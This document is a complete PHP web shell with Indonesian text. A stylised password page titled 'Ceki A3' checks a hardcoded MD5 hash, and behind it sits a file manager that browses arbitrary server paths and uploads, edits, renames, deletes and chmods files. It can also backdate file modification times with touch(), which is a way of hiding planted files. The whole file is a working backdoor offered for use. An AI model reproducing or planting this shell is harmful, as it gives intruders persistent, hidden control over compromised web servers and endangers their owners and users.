<?php
session_start();
$password = "44a77fd86046fda883b1b34a8eab34e1";


function login_shell()
{
?>

<!DOCTYPE html>

<html lang="en"> 

 <head> 

  <meta charset="UTF-8"> 

  <title>Ceki A3</title> 

  <style>
    @import url('https://fonts.googleapis.com/css2?family=Quicksand:wght@300;400;500;600;700&display=swap');
*
{
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: 'Quicksand', sans-serif;
}
body 
{
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
  background: #000;
}
section 
{
  position: absolute;
  width: 100vw;
  height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 2px;
  flex-wrap: wrap;
  overflow: hidden;
}
.gradient-text {
  background: linear-gradient(to right, #c20306, #cd0606, #d00805);
  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
}
.sayur{
color: #fff;
}
section::before 
{
  content: '';
  position: absolute;
  width: 100%;
  height: 100%;
  background: linear-gradient(#000,rgb(197, 8, 8),#000);
  animation: animate 5s linear infinite;
}
@keyframes animate 
{
  0%
  {
    transform: translateY(-100%);
  }
  100%
  {
    transform: translateY(100%);
  }
}
section span 
{
  position: relative;
  display: block;
  width: calc(6.25vw - 2px);
  height: calc(6.25vw - 2px);
  background: #181818;
  z-index: 2;
  transition: 1.5s;
}
section span:hover 
{
  background: rgb(197, 8, 8);
  transition: 0s;
}

section .signin
{
  position: absolute;
  width: 400px;
  background: #222;  
  z-index: 1000;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 40px;
  border-radius: 4px;
  box-shadow: 0 15px 35px rgba(0,0,0,9);
}
section .signin .content 
{
  position: relative;
  width: 100%;
  display: flex;
  justify-content: center;
  align-items: center;
  flex-direction: column;
  gap: 10px;
}
section .signin .content h2 
{
  font-size: 2em;
  color: rgb(197, 8, 8);
  text-transform: uppercase;
}
section .signin .content .form 
{
  width: 100%;
  display: flex;
  flex-direction: column;
  gap: 25px;
}
section .signin .content .form .inputBox
{
  position: relative;
  width: 100%;
}
section .signin .content .form .inputBox input 
{
  position: relative;
  width: 100%;
  background: #333;
  border: none;
  outline: none;
  padding: 25px 10px 7.5px;
  border-radius: 4px;
  color: #fff;
  font-weight: 500;
  font-size: 1em;
}
section .signin .content .form .inputBox i 
{
  position: absolute;
  left: 0;
  padding: 15px 10px;
  font-style: normal;
  color: #aaa;
  transition: 0.5s;
  pointer-events: none;
}
.signin .content .form .inputBox input:focus ~ i,
.signin .content .form .inputBox input:valid ~ i
{
  transform: translateY(-7.5px);
  font-size: 0.8em;
  color: #fff;
}
.signin .content .form .links 
{
  position: relative;
  width: 100%;
  display: flex;
  justify-content: space-between;
}
.signin .content .form .links a 
{
  color: #fff;
  text-decoration: none;
}
.signin .content .form .links a:nth-child(2)
{
  color: rgb(197, 8, 8);
  font-weight: 600;
}
.signin .content .form .inputBox input[type="submit"]
{
  padding: 10px;
  background: rgb(197, 8, 8);
  color: #fff;
  font-weight: 600;
  font-size: 1.35em;
  letter-spacing: 0.05em;
  cursor: pointer;
}
input[type="submit"]:active
{
  opacity: 0.6;
}
@media (max-width: 900px)
{
  section span 
  {
    width: calc(10vw - 2px);
    height: calc(10vw - 2px);
  }
}
@media (max-width: 600px)
{
  section span 
  {
    width: calc(20vw - 2px);
    height: calc(20vw - 2px);
  }
}
  </style>

 </head> 

 <body> <!-- partial:index.partial.html --> 

  <section> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> <span></span> 

   <div class="signin"> 

    <div class="content"> 

     <h2 class="gradient-text">CEKI A3</h2> 
     <p class="sayur">Sutil Dodol Seng Tratak</p>

     <div class="form"> 

      <div class="inputBox"> 
      </div> 
      <form class="login-container" action="" method="post">
      <div class="inputBox"> 

       <input type="password" required name="pass"> <i>Password</i> 

      </div> 

      <div class="links"> <a href="#"></a> <a href="#"></a> 

      </div> 

      <div class="inputBox"> 

       <input style="margin-top: 20px;" type="submit" name="submit" value="Login"> 

      </div> 

     </div> 

    </div> 

   </div> 

  </section> <!-- partial --> 

 </body>

</html>
<?php
    exit;
}
if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    } else {
        login_shell();
    }
}
?>
<?php
// Deteksi OS Windows
$isWindows = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

// Fungsi escape output HTML
function x($str) {
    return htmlspecialchars($str, ENT_QUOTES, 'UTF-8');
}

// Fungsi format ukuran file (Bytes ke KB, MB, dst)
function formatSize($bytes) {
    if ($bytes < 1024) return $bytes . ' B';
    $units = ['KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < count($units) - 1) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

// Fungsi memberi warna pada permission (contoh sederhana)
function permColor($path) {
    $perm = substr(sprintf('%o', fileperms($path)), -4);
    if (preg_match('/^0?777$/', $perm)) {
        return ' style="color:red;font-weight:bold;"'; // permisif banget, merah
    }
    return '';
}

// Ambil path input dari query ?d= atau default ke current working directory
$inputPath = isset($_GET['d']) ? urldecode($_GET['d']) : getcwd();

// Normalisasi path sesuai OS
$currentPath = $isWindows
    ? str_replace(['/', '\\'], DIRECTORY_SEPARATOR, $inputPath)
    : str_replace(['\\', '/'], DIRECTORY_SEPARATOR, $inputPath);

if (!is_dir($currentPath)) {
    die("Direktori tidak valid: <code>" . x($currentPath) . "</code>");
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Upload file
    if (isset($_POST['upload']) && isset($_FILES['uploaded_file'])) {
        $targetPath = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_FILES['uploaded_file']['name']);
        if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $targetPath)) {
            echo "<p style='color:green;'>File berhasil diupload.</p>";
        } else {
            echo "<p style='color:red;'>Upload gagal.</p>";
        }
    }

    if (isset($_POST['save_edit'])) {
        $edit_path = $_POST['edit_path'] ?? '';
        $edit_content = $_POST['edit_content'] ?? '';
        if ($edit_path && is_file($edit_path) && is_writable($edit_path)) {
            file_put_contents($edit_path, $edit_content);
            echo "<script>alert('File berhasil disimpan!');</script>";
        } else {
            echo "<script>alert('Gagal menyimpan file!');</script>";
        }
    }

    $edit_file_path = '';
$edit_file_content = '';
if (isset($_POST['edit'])) {
    $edit_file_path = $_POST['edit_path'];
    if (is_file($edit_file_path) && is_readable($edit_file_path)) {
        $edit_file_content = file_get_contents($edit_file_path);
    }
}

    // Buat folder
    if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
        $newFolder = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['folder_name']);
        if (!file_exists($newFolder)) {
            if (mkdir($newFolder)) {
                echo "<p style='color:green;'>Folder berhasil dibuat.</p>";
            } else {
                echo "<p style='color:red;'>Gagal membuat folder.</p>";
            }
        } else {
            echo "<p style='color:red;'>Folder sudah ada.</p>";
        }
    }

    // Buat file kosong
    if (isset($_POST['create_file']) && !empty($_POST['file_name'])) {
        $newFile = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . basename($_POST['file_name']);
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, '') !== false) {
                echo "<p style='color:green;'>File berhasil dibuat.</p>";
            } else {
                echo "<p style='color:red;'>Gagal membuat file.</p>";
            }
        } else {
            echo "<p style='color:red;'>File sudah ada.</p>";
        }
    }

    // Rename file/folder
    if (isset($_POST['rename']) && !empty($_POST['rename_path']) && !empty($_POST['new_name'])) {
        $oldPath = $_POST['rename_path'];
        $newPath = dirname($oldPath) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
        if (!file_exists($newPath)) {
            if (rename($oldPath, $newPath)) {
                echo "<p style='color:green;'>Berhasil rename.</p>";
            } else {
                echo "<p style='color:red;'>Rename gagal.</p>";
            }
        } else {
            echo "<p style='color:red;'>Nama baru sudah ada.</p>";
        }
    }

    // Ubah permission CHMOD
    if (isset($_POST['change_perm']) && !empty($_POST['perm_path']) && !empty($_POST['permissions'])) {
        $permPath = $_POST['perm_path'];
        $permNum = intval($_POST['permissions'], 8);
        if (chmod($permPath, $permNum)) {
            echo "<p style='color:green;'>Permission berhasil diubah.</p>";
        } else {
            echo "<p style='color:red;'>Gagal mengubah permission.</p>";
        }
    }

    // Ubah tanggal file/folder
    if (isset($_POST['change_time']) && !empty($_POST['time_path']) && !empty($_POST['new_time'])) {
        $timePath = $_POST['time_path'];
        $newTime = strtotime($_POST['new_time']);
        if ($newTime !== false && touch($timePath, $newTime)) {
            echo "<p style='color:green;'>Tanggal berhasil diubah.</p>";
        } else {
            echo "<p style='color:red;'>Gagal mengubah tanggal.</p>";
        }
    }

    // Hapus file/folder (folder harus kosong)
    if (isset($_POST['delete']) && !empty($_POST['delete_path'])) {
        $delPath = $_POST['delete_path'];
        if (is_dir($delPath)) {
            if (@rmdir($delPath)) {
                echo "<p style='color:green;'>Folder berhasil dihapus.</p>";
            } else {
                echo "<p style='color:red;'>Gagal menghapus folder (pastikan kosong).</p>";
            }
        } else {
            if (@unlink($delPath)) {
                echo "<p style='color:green;'>File berhasil dihapus.</p>";
            } else {
                echo "<p style='color:red;'>Gagal menghapus file.</p>";
            }
        }
    }
}
?>
<script>
function confirmDelete() {
    return confirm("Yakin ingin menghapus item ini?");
}
</script>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>Tepek</title>
    <style>
        table {border-collapse: collapse; width: 100%;}
        th, td {border: 1px solid #ccc; padding: 6px; text-align: left;}
        th {background: #eee;}
        form {margin: 0;}
        input[type="text"] {width: 150px;}
        td form {display: inline-block; margin-right: 5px;}

        .form-container {
        display: flex;
        gap: 20px; /* jarak antar form */
        align-items: flex-start; /* rata atas */
    }
    form {
        display: flex;
        gap: 8px; /* jarak antara input dan tombol */
    }
    input[type="file"],
    input[type="text"] {
        padding: 6px 8px;
        font-size: 12px;
    }
    button {
        padding: 6px 12px;
        font-size: 12px;
        cursor: pointer;
    }
    </style>
</head>
<body>

<p>Path saat ini:
<?php
$breadcrumbs = preg_split('/[\/\\\\]/', $currentPath);
$pathSoFar = $isWindows ? '' : '/';
foreach ($breadcrumbs as $i => $crumb) {
    if ($crumb === '') continue;

    if ($isWindows) {
        if ($pathSoFar === '') {
            $pathSoFar = $crumb;
        } else {
            $pathSoFar .= DIRECTORY_SEPARATOR . $crumb;
        }
    } else {
        if ($pathSoFar === '/') {
            $pathSoFar .= $crumb;
        } else {
            $pathSoFar .= DIRECTORY_SEPARATOR . $crumb;
        }
    }

    echo '<a href="?d=' . urlencode($pathSoFar) . '">' . x($crumb) . '</a>';
    if ($i < count($breadcrumbs) - 1) echo '/';
}
?>
</p>

<div class="form-container">
  <form method="POST" enctype="multipart/form-data">
    <input type="file" name="uploaded_file" required>
    <button class="upload-button" type="submit" name="upload">Upload</button>
  </form>

  <form method="POST">
    <input type="text" name="file_name" placeholder="Nama file (misal: file.txt)" required>
    <button type="submit" name="create_file">Buat File</button>
  </form>

  <form method="POST">
    <input type="text" name="folder_name" placeholder="Nama folder" required>
    <button type="submit" name="create_folder">Buat Folder</button>
  </form>
</div>

<table>
    <tr><th>Nama</th><th>Ukuran</th><th>Permission</th><th>Owner</th><th>Group</th><th>Tanggal</th><th>Aksi</th></tr>
    <?php
    $items = scandir($currentPath);
    $folders = [];
    $files = [];
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
        if (is_dir($fullPath)) {
            $folders[] = $item;
        } else {
            $files[] = $item;
        }
    }
    $sortedItems = array_merge($folders, $files);

    foreach ($sortedItems as $item) {
        $fullPath = rtrim($currentPath, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $item;
        $perm = substr(sprintf('%o', fileperms($fullPath)), -4);
        $stat = stat($fullPath);
        $owner = function_exists('posix_getpwuid') ? (posix_getpwuid($stat['uid']) ?? ['name' => $stat['uid']])['name'] : $stat['uid'];
        $group = function_exists('posix_getgrgid') ? (posix_getgrgid($stat['gid']) ?? ['name' => $stat['gid']])['name'] : $stat['gid'];
        $isDir = is_dir($fullPath);
        $date = date("Y-m-d H:i:s", filemtime($fullPath));

        echo '<tr>';
        echo '<td><a href="?d=' . urlencode($fullPath) . '">' . x($item) . '</a></td>';
        echo '<td>' . ($isDir ? 'Folder' : formatSize(filesize($fullPath))) . '</td>';
        echo '<td' . permColor($fullPath) . '>' . $perm . '</td>';
        echo '<td>' . x($owner) . '</td>';
        echo '<td>' . x($group) . '</td>';
        echo '<td>' . $date . '</td>';
        echo '<td>';
        if (!$isDir) {
            echo '<button type="button" onclick="openModal(\'' . addslashes($fullPath) . '\')">Edit</button>';
        }
        echo '<form method="POST" style="display:inline;">
                <input type="hidden" name="rename_path" value="' . x($fullPath) . '">
                <input type="text" name="new_name" placeholder="Rename" required>
                <button name="rename">Rename</button>
            </form> ';
        echo '<form method="POST" style="display:inline;">
                <input type="hidden" name="perm_path" value="' . x($fullPath) . '">
                <input type="text" name="permissions" placeholder="0755" required>
                <button name="change_perm">CHMOD</button>
            </form> ';
        echo '<form method="POST" style="display:inline;">
                <input type="hidden" name="time_path" value="' . x($fullPath) . '">
                <input type="text" name="new_time" placeholder="2024-08-18 01:50:07" required>
                <button name="change_time">Ubah Tanggal</button>
            </form> ';
        echo '<form method="POST" style="display:inline;" onsubmit="return confirmDelete();">
                <input type="hidden" name="delete_path" value="' . x($fullPath) . '">
                <button name="delete">Hapus</button>
            </form>';
        echo '</td>';
        echo '</tr>';
    }
    ?>
</table>
<!-- Modal Edit File -->
<div id="editModal" style="display:none; position:fixed; top:10%; left:50%; transform:translateX(-50%); width:80%; max-width:800px; background:#fff; border:1px solid #ccc; padding:20px; box-shadow:0 5px 15px rgba(0,0,0,0.3); z-index:1000;">
    <h3>Edit File: <span id="modalFileName"></span></h3>
    <form method="POST" onsubmit="return confirm('Simpan perubahan file?');">
        <input type="hidden" name="edit_path" id="edit_path" value="">
        <textarea name="edit_content" id="edit_content" style="width:100%; height:400px; font-family: monospace;"><?php echo x($edit_file_content); ?></textarea><br>
        <button type="submit" name="save_edit">Simpan</button>
        <button type="button" onclick="closeModal()">Batal</button>
    </form>
</div>
<div id="modalOverlay" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:#0008; z-index:999;" onclick="closeModal()"></div>

<script>
function openModal(filePath) {
    // Fetch isi file via AJAX (atau gunakan PHP yg sudah siap di page ini)
    // Tapi supaya sederhana, kita submit form ke server utk load konten edit file.
    // Kita gunakan pendekatan reload halaman dg POST, tapi modal muncul langsung.

    // Jadi kita buat form POST dinamis dan submit, tapi lebih baik pake fetch/ajax sebenarnya.
    
    // Cara simple: simpan ke input hidden, reload halaman dg POST dan modal muncul.

    // Di sini kita buat form dan submit secara otomatis
    let form = document.createElement('form');
    form.method = 'POST';
    form.style.display = 'none';

    let inputEdit = document.createElement('input');
    inputEdit.name = 'edit_path';
    inputEdit.value = filePath;
    form.appendChild(inputEdit);

    let inputEditBtn = document.createElement('input');
    inputEditBtn.name = 'edit';
    inputEditBtn.value = '1';
    form.appendChild(inputEditBtn);

    document.body.appendChild(form);
    form.submit();
}

function closeModal() {
    document.getElementById('editModal').style.display = 'none';
    document.getElementById('modalOverlay').style.display = 'none';
}

// Jika PHP menyiapkan konten edit file, tampilkan modal
<?php if($edit_file_path): ?>
    document.getElementById('editModal').style.display = 'block';
    document.getElementById('modalOverlay').style.display = 'block';
    document.getElementById('modalFileName').textContent = '<?php echo x(basename($edit_file_path)); ?>';
    document.getElementById('edit_path').value = '<?php echo x($edit_file_path); ?>';
<?php endif; ?>
</script>

</body>
